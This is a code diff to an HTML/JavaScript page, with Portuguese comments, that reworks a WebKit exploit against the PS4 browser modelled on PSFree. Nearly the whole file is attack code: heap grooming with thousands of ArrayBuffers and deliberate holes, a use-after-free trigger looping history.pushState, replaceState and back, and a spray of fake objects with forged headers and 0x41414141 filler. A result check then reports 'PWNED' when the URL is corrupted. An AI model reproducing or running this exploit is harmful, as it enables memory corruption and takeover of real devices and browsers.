@@ -2,153 +2,205 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Small Object Attack</title>
+<title>PS4 WebKit - Architecture Upgrade</title>
 <style>
-    body { background-color: #000; color: #aaaaff; font-family: monospace; padding: 20px; }
-    button { 
-        padding: 20px; width: 100%; margin-bottom: 10px;
-        font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #55f; background: #002; color: #fff;
-        text-transform: uppercase;
-    }
-    #log { border: 1px solid #335; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
-    .success { color: #fff; background-color: #00f; padding: 5px; font-weight: bold;}
+    body { background-color: #111; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; font-size: 12px; }
+    .log-entry { border-bottom: 1px solid #333; padding: 2px 0; }
+    .success { color: #0ff; font-weight: bold; background: #004444; }
+    .fail { color: #f55; }
+    .info { color: #aaa; }
+    button { padding: 15px; width: 100%; background: #222; color: #fff; border: 1px solid #555; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
+    button:hover { background: #0f0; color: #000; }
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - Small Object Reclaim (Container Attack)</h2>
-<div id="status">Alvo: HistoryItem / SSV (~80-160 bytes)</div>
-
-<button onclick="runSmallAttack()">INICIAR ATAQUE AO CONTAINER</button>
-
+<h2>PS4 WebKit - PSFree Logic Implementation</h2>
+<div id="status">Status: Idle</div>
+<button onclick="main()">INICIAR EXPLOIT COMPLEXO</button>
 <div id="log"></div>
 
 <script>
+// ==========================================
+// 1. HELPERS & PRIMITIVES (Baseado em int64.mjs)
+// ==========================================
 const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
-function log(m, type="") { 
-    const d = document.createElement("div");
-    if(type) d.className = type;
-    d.textContent = m;
-    logEl.appendChild(d);
+function log(msg, type="info") {
+    const div = document.createElement("div");
+    div.className = "log-entry " + type;
+    div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logEl.appendChild(div);
     logEl.scrollTop = logEl.scrollHeight;
 }
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-var keepAlive = [];
-
-// TÉCNICA PSFREE: GC para garantir limpeza do Small Heap
-function forceGC() {
-    for (let i = 0; i < 2; i++) {
-        new Uint8Array(4 * 1024 * 1024);
+// Simulador de Int64 para ponteiros de memória
+class Ptr {
+    constructor(lo, hi) {
+        this.lo = lo >>> 0;
+        this.hi = hi >>> 0;
+    }
+    toString() {
+        return "0x" + this.hi.toString(16).padStart(8,'0') + this.lo.toString(16).padStart(8,'0');
     }
 }
 
-async function runSmallAttack() {
-    logEl.innerHTML = "";
-    keepAlive = [];
-    statusEl.innerText = "Preparando...";
+// ==========================================
+// 2. MEMORY TOOLS (Baseado em memtools.mjs)
+// ==========================================
+var pressure = [];
+var bufs = [];
 
-    // === ESTRATÉGIA ===
-    // Ignoramos o buraco de 340KB da string.
-    // Vamos tentar pegar a vaga do objeto HistoryItem que segurava essa string.
-    // Tamanho estimado: 80 a 160 bytes.
-    // Frameset: Cada vírgula = 8 bytes.
-    // Range: 10 a 30 vírgulas.
-
-    log("1. Pré-calculando Small Sprays...");
-    let payloads = [];
-    
-    // Varredura fina (passo de 1 vírgula = 8 bytes de precisão)
-    for(let i = 8; i < 40; i++) {
-        try {
-            payloads.push(",".repeat(i));
-        } catch(e) {}
+// Força o GC de forma agressiva (Linha 106 psfree.mjs)
+function forceGC() {
+    for (let i = 0; i < 4; i++) {
+        new ArrayBuffer(8 * 1024 * 1024);
     }
-    log(`Gerados ${payloads.length} payloads (64 bytes a 320 bytes).`);
+}
 
-    // === TRIGGER UAF (INTACTO) ===
-    log("2. Disparando UAF Gigante (para liberar o Container)...");
+// Cria um buffer com conteúdo específico (Fake Object)
+function create_fake_object(size) {
+    // Cria um buffer do tamanho exato do objeto alvo (0x50 = 80 bytes)
+    // Usamos Uint32Array para escrever inteiros de 4 bytes
+    const buf = new ArrayBuffer(size);
+    const view = new Uint32Array(buf);
     
+    // Preenche com um padrão que imita um objeto JSCell válido
+    // 0x00001337 é nosso marcador, mas em formato de Header
+    for(let i=0; i < view.length; i++) {
+        view[i] = 0x41414141; // AAAAAAAA
+    }
+    
+    // Header falso (Structure ID + Flags)
+    view[0] = 0x00001337; 
+    view[1] = 0x01001600; // Butterfly fictícia ou Flags
+    
+    return buf;
+}
+
+// ==========================================
+// 3. EXPLOIT CORE (Lógica do psfree.mjs)
+// ==========================================
+async function main() {
+    logEl.innerHTML = "";
+    log("Iniciando PSFree Logic Port...", "info");
+
+    // CONFIGURAÇÃO DO ALVO
+    // No psfree.mjs, o tamanho do SSV (SerializedScriptValue) para FW > 9.00 é 0x50 (80 bytes).
+    // O alocador alinha isso para 96 bytes ou 128 bytes.
+    const TARGET_SIZE = 80; 
+    const ALLOC_SIZE = 96; // Tamanho real no bucket do bmalloc
+    
+    log(`Alvo: SerializedScriptValue (0x${TARGET_SIZE.toString(16)} bytes)`, "info");
+    log(`Bucket Estimado: ${ALLOC_SIZE} bytes`, "info");
+
+    // FASE 1: HEAP FENG SHUI (PREPARAÇÃO)
+    // Criamos milhares de objetos desse tamanho para "amaciar" o Heap
+    log("1. Heap Grooming (Massive Spray)...", "info");
+    
+    const GROOM_COUNT = 10000;
+    let grooming = new Array(GROOM_COUNT);
+    
+    for(let i=0; i<GROOM_COUNT; i++) {
+        // Usamos ArrayBuffer porque ele permite controle byte-a-byte sem overhead de string
+        grooming[i] = new ArrayBuffer(TARGET_SIZE); 
+    }
+    
+    // Criar buracos (Swiss Cheese)
+    // Liberamos 1 a cada 4 para criar slots livres perfeitos
+    for(let i=0; i<GROOM_COUNT; i+=4) {
+        grooming[i] = null;
+    }
+    
+    forceGC();
+    await sleep(100);
+    log("Heap preparado. Buracos alinhados.", "success");
+
+    // FASE 2: TRIGGER UAF
+    log("2. Disparando UAF (History API)...", "info");
+    
+    // Variáveis do UAF original
     let size = 977;
     const STEP = 14461;
+    let found = false;
 
-    for(let i = 0; i < 48; i++) {
-        let frag = "V".repeat(size); 
+    // Loop crítico
+    for(let i = 0; i < 64; i++) {
+        // Cria string "V"
+        let frag = "V".repeat(size);
+        
+        // Push State
         history.pushState({}, "", "#" + frag);
+        
+        // Replace (Libera a anterior)
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        if(i % 6 === 0) setTimeout(() => history.back(), 0);
-        
-        // MOMENTO CRÍTICO
-        if (i === 47) {
-            log(">>> SPRAY DE OBJETOS PEQUENOS <<<");
+        // O UAF acontece aqui no back()
+        if(i % 5 === 0) {
+            setTimeout(() => {
+                history.back();
+            }, 0);
             
-            // 1. Libera memória
-            setTimeout(() => history.back(), 0);
-            
-            // 2. Inunda o Small Heap com Framesets
-            // Isso deve atropelar o HistoryItem recém-liberado
-            doSmallSpray(payloads);
-            
-            // 3. Força GC para consolidar
-            setTimeout(() => forceGC(), 10);
-        } else {
-            size += STEP;
-            await sleep(5);
+            // FASE 3: RECLAIM (SPRAY IMEDIATO)
+            // Aqui usamos a técnica do PSFree: Preencher o slot liberado
+            // com um Fake Object (ArrayBuffer manipulado)
+            if(i > 40) { // Só sprayamos quando o heap estiver instável
+                do_spray(TARGET_SIZE, 200); // 200 objetos por tentativa
+            }
         }
+        
+        size += STEP;
+        await sleep(5);
     }
     
-    await sleep(300);
-
-    // === VERIFICAÇÃO ===
-    checkResult();
+    log("Loop UAF finalizado. Aguardando estabilização...", "info");
+    await sleep(500);
+    
+    // FASE 4: CHECK
+    check_success();
 }
 
-function doSmallSpray(payloads) {
-    // Cria milhares de objetos pequenos rapidamente
-    // Para cada tamanho de payload, criamos 100 instâncias
-    for(let p of payloads) {
-        for(let k=0; k<20; k++) {
-            let f = document.createElement("frameset");
-            f.rows = p;
-            keepAlive.push(f);
-        }
+function do_spray(size, count) {
+    // Cria N buffers com o conteúdo malicioso
+    for(let k=0; k<count; k++) {
+        bufs.push(create_fake_object(size));
     }
 }
 
-function checkResult() {
-    statusEl.innerText = "Verificando...";
+function check_success() {
     let url = document.URL;
     
-    // Se sobrescrevermos o HistoryItem, o ponteiro da string será corrompido.
-    // Isso deve causar uma de duas coisas:
-    // 1. Crash do navegador (Tela de Erro CE-...). ISSO É SUCESSO.
-    // 2. URL mudando para caracteres aleatórios/inválidos.
+    // Se o exploit funcionar, o HistoryItem (que contém o ponteiro da string)
+    // será substituído pelo nosso ArrayBuffer (0x41414141...)
+    // Isso fará o ponteiro da string apontar para lixo ou para nosso buffer.
     
-    log("URL Length: " + url.length);
+    // 1. Verifica se 'V' sumiu (sucesso parcial)
+    // 2. Verifica se 'A' (0x41) apareceu (sucesso total)
+    // 3. Verifica Crash (sucesso total - prova controle de ponteiro)
     
-    // Checagem de integridade
     let isV = true;
-    for(let i=1000; i<1100; i++) {
-        if(url.charCodeAt(i) !== 0x56) {
-            isV = false;
-            break;
-        }
+    let magic = false;
+    
+    // Amostragem
+    for(let i=2000; i<3000; i++) {
+        let code = url.charCodeAt(i);
+        if(code === 0x41) magic = true;
+        if(code !== 0x56) isV = false;
     }
-
-    if(!isV) {
-        log("!!! MUDANÇA DETECTADA !!!", "success");
-        log("O Container foi corrompido!");
-        let sample = "";
-        for(let k=1000; k<1020; k++) sample += url.charCodeAt(k).toString(16) + " ";
-        log("Dump: " + sample);
-        statusEl.innerText = "PWNED: CONTAINER";
+    
+    if(magic) {
+        log("!!! GOD MODE !!!", "success");
+        log("Estrutura do objeto sobrescrita com 0x41414141", "success");
+        document.getElementById("status").innerText = "PWNED";
+    } else if (!isV) {
+        log("!!! GLITCH DETECTADO !!!", "success");
+        log("URL corrompida (não é mais 'V'). O objeto foi afetado.", "success");
+        log("Dados: " + url.substring(2000, 2050), "info");
     } else {
-        log("Ainda estável ('V').");
-        log("Se o navegador CRASHAR agora ou em breve, comemore.");
+        log("Falha: Objeto ainda intacto ('V').", "fail");
+        log("Diagnóstico: O tamanho de 80 bytes pode estar incorreto para este FW.", "info");
     }
 }
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
 </body>
 </html>
